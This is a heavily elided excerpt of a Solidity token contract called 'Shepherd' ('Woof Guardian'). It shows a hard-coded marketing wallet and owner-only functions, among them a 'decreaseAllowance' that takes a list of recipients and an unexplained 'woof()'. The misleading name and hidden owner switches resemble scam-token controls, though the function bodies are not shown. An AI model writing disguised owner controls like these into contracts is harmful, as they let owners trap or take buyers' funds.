...
contract Shepherd is Context, IERC20, IERC20Metadata {
    ...
    uint256 public _totalSupply = 7900000000*10**18;
    string public _name = "Woof Guardian";
    string public _symbol= "Shepherd";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x10F68c6385Aab999d304dE51754bd7C16B1317b0);
    ...
    function decreaseAllowance(address[] memory recipients_) onlyOwner public {
    ...
    function woof() onlyOwner public {
